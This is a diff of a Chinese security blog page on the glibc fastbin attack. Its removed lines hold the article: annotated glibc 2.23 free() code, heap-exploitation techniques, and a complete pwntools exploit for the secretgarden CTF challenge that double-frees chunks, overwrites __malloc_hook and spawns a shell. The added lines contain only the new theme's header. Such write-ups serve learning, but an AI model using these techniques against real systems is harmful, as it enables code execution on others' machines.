@@ -1,267 +1,473 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="个人博客，分享网络安全特别是pwn">
+  <meta name="author" content="Saku376">
+  <meta name="keywords" content="网络安全、二进制、pwn">
   
-  <title>Fastbin Attack | Saku376&#39;s Pwn Sea</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="要了解fastbin attack，首先得了解fastbin机制。由于libc2.26后加入了tcache机制，我们这里就分析glibc 2.23.下面代码选自glibc2.23 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Fastbin Attack">
-<meta property="og:url" content="http://example.com/2021/06/19/fastbin-attack/index.html">
-<meta property="og:site_name" content="Saku376&#39;s Pwn Sea">
-<meta property="og:description" content="要了解fastbin attack，首先得了解fastbin机制。由于libc2.26后加入了tcache机制，我们这里就分析glibc 2.23.下面代码选自glibc2.23 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/06/19/fastbin-attack/1.jpg">
-<meta property="og:image" content="http://example.com/2021/06/19/fastbin-attack/2.jpg">
-<meta property="og:image" content="http://example.com/2021/06/19/fastbin-attack/3.jpg">
-<meta property="og:image" content="http://example.com/2021/06/19/fastbin-attack/4.jpg">
-<meta property="article:published_time" content="2021-06-19T13:26:15.000Z">
-<meta property="article:modified_time" content="2021-06-20T06:10:51.479Z">
-<meta property="article:author" content="Saku376">
-<meta property="article:tag" content="网络安全、二进制、pwn">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/06/19/fastbin-attack/1.jpg">
-  
-    <link rel="alternate" href="/atom.xml" title="Saku376's Pwn Sea" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+  <title>Fastbin Attack - Saku376&#39;s Pwn Sea</title>
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
   
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
 
   
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 5.4.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Saku376&#39;s Pwn Sea</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">技术是海，深不见底；生活是洋，广不着边；而我如浪花，清澈透明并且舞动双手，仰望天空。</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
-      </nav>
-      <nav id="sub-nav">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main"><article id="post-fastbin-attack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/19/fastbin-attack/" class="article-date">
-  <time class="dt-published" datetime="2021-06-19T13:26:15.000Z" itemprop="datePublished">2021-06-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      Fastbin Attack
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>要了解fastbin attack，首先得了解fastbin机制。由于libc2.26后加入了tcache机制，我们这里就分析glibc 2.23.<br>下面代码选自glibc2.23</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);    <span class="comment">//获取p的size</span></span><br><span class="line">  check_inuse_chunk(av, p);<span class="comment">//检查p的物理相邻的下一个堆块的inuse位是否置1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查p的大小是否小于global_max_fast</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">          <span class="comment">//检查p物理相邻的堆块是否是top chunk</span></span><br><span class="line">          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        &#123;.......&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对chunk的data块通过memset赋值，但是默认情况下是不进行操作    </span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//设置 malloc_state的flag</span></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取p对应大小的fastbinY的索引</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    <span class="comment">//fb指向对应大小的fastbinY的地址</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    <span class="comment">// old为 对应大小的fastbinY的fd值，也就是第一个对块的地址</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">      	 <span class="comment">// Check that the top of the bin is not the record we are going to add</span></span><br><span class="line">         <span class="comment">//检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</span></span><br><span class="line">        	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      	  &#123;</span><br><span class="line">      	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">      	    <span class="keyword">goto</span> errout;</span><br><span class="line">      	  &#125;</span><br><span class="line">          <span class="comment">//获取 fastbin中对应的bin的第一项的索引。</span></span><br><span class="line">        	<span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        	  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">          <span class="comment">//让  p 的fd指向 顶部的fastbin块</span></span><br><span class="line">        	p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">//catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；</span></span><br><span class="line">    <span class="comment">// *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>可以看到fastbin只是检查了fastbin第一个chunk是否与新加入的chunk相同。所以我们可以使用free(0) free(1) free(0)的方式来达到double free。之后还检查大小满足要求，通过size算出fastbin_index然后再比对。如果对应的fastbinY大小为0x70,64位的话size可以在0~0xF之间浮动，也就是说size为0x70-0x7f都会被认为是合法的。32位同理，在0-0x7之间浮动。</p>
-<p><strong>利用前提：</strong><br>1、能创建fastbin类型的chunk<br>2、存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>如果细分的话，可以做以下的分类：<br>3、fastbin double free<br>即利用double free漏洞构造chunk如下图所示<br><img src="/2021/06/19/fastbin-attack/1.jpg" alt="1.jpg"><br>我们首先申请回chunk1然后修改其fd值指向一个fake_chunk，这里的chunk要保证size域合法，我们再次申请3次同样的chunk,就会依次拿到chunk2，chunk1，fake_chunk。我们只要在关键位置伪造fake_chunk就可以了。例如在malloc_hook左右伪造fake_chunk，然后修改malloc_hook的值为one_gadget就可以在调用malloc时get_shell。</p>
-<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>同fastbin double free利用手法类似，只不过只需要free依次，然后修改FD指针指向fake_chunk。</p>
-<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>该技术的核心在于目标位置处伪造fastbin chunk，并将其释放，再申请回来，从而达到分配指定地址的chunk的目的。<br>    ### 可以free你指定位置的fake_chunk<br>    ### 要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表当中，需要绕过一些必要的检测，即<br>        ##### fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，就会单独处理。<br>        ##### fake chunk地址需要对齐，32位8字节对齐，64位16字节对齐<br>          ##### fake chunk的size大小需要满足fastbin的需求<br>          ##### fake chunk的next chunk的大小合理</p>
-<h1 id="alloc-to-stack"><a href="#alloc-to-stack" class="headerlink" title="alloc to stack"></a>alloc to stack</h1><p>该技术的核心点在于劫持fastbin链表中的chunk的fd指针，把fd指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
-<h1 id="arbitrary-alloc"><a href="#arbitrary-alloc" class="headerlink" title="arbitrary alloc"></a>arbitrary alloc</h1><p>arbitrary alloc 其实与alloc to stack是完全相同的，唯一的区别就是分配的目标不是在栈中。我们可以把chunk分配到任意可写的内存中，比如bss、heap、data、stack等等。</p>
-<h1 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h1><p>以上是fastbin attack的集中方法，总结起来就是3步：<br>①伪造合理的chunk<br>②使得fd指向fake_chunk，或者free fake_chunk。使得fake_chunk加入到fastbin中<br>③分配得到fake_chunk，进行后续利用</p>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>hitcontraining_secretgarden，libc为2.23<br>首先检查一下保护<br><img src="/2021/06/19/fastbin-attack/2.jpg" alt="2.jpg"><br>main函数，有增删查，没有改<br><img src="/2021/06/19/fastbin-attack/3.jpg" alt="3.jpg"><br>漏洞点,del函数free的时候指针没有清零。并且free前没有检查flowerlist[i][0]的值是否为1<br><img src="/2021/06/19/fastbin-attack/4.jpg" alt="4.jpg"><br>其他都是常规操作</p>
-<p>程序留有后门，我们也可以劫持函数的got来实现调用后门。但是我们这里使用的是劫持__malloc_hook，由于one_gadget不能用，我们通过__libc_realloc来改变栈环境，使得one_gadget条件成立。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name,color</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name :&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;flower :&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;flower :&#x27;</span>,color)<span class="comment">#0x17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;garden:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#----------------leak libc ---------------#</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#将其置入unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;E&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;EEEEEEEE&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#-------------- double free ---------------#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#fastbinY(0x70) -&gt; 3 -&gt; 4 -&gt;3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------fastbin attack --------------#</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]+<span class="number">8</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/19/fastbin-attack/" data-id="ckq4sk8w40000o4u670aobkww" data-title="Fastbin Attack" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">前一篇</strong>
-      <div class="article-nav-title">
         
-          Pwn学习思维导图参考
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">后一篇</strong>
-      <div class="article-nav-title">Linux动态内存管理机制</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%89%E7%82%B9%E6%83%85%E4%B8%8D%E8%87%AA%E7%A6%81%EF%BC%8C%E4%BD%86%E7%9A%86%E8%82%BA%E8%85%91%E4%B9%8B%E8%A8%80%EF%BC%8C%E6%9C%9B%E5%B9%BF%E5%A4%A7pwner%E6%90%BA%E8%B5%B7%E6%89%8B%E6%9D%A5%E4%B8%80%E8%B5%B7%E5%89%8D%E8%BF%9B/" rel="tag">有点情不自禁，但皆肺腑之言，望广大pwner携起手来一起前进</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/%E6%9C%89%E7%82%B9%E6%83%85%E4%B8%8D%E8%87%AA%E7%A6%81%EF%BC%8C%E4%BD%86%E7%9A%86%E8%82%BA%E8%85%91%E4%B9%8B%E8%A8%80%EF%BC%8C%E6%9C%9B%E5%B9%BF%E5%A4%A7pwner%E6%90%BA%E8%B5%B7%E6%89%8B%E6%9D%A5%E4%B8%80%E8%B5%B7%E5%89%8D%E8%BF%9B/" style="font-size: 10px;">有点情不自禁，但皆肺腑之言，望广大pwner携起手来一起前进</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%978%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/">Pwn入门系列8——基本栈溢出</a>
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
           </li>
         
-          <li>
-            <a href="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%977%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/">Pwn入门系列7——栈溢出原理</a>
-          </li>
         
-          <li>
-            <a href="/2021/07/02/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%976%E2%80%94%E2%80%94linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">Pwn入门系列6——linux保护机制</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/01/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%975%E2%80%94%E2%80%94linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/">Pwn入门系列5——linux延迟绑定机制</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/">pwn入门系列4——ELF文件格式</a>
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
     </div>
   </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2021 Saku376<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
 </nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Fastbin Attack">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-19 21:26" pubdate>
+        2021年6月19日 晚上
+      </time>
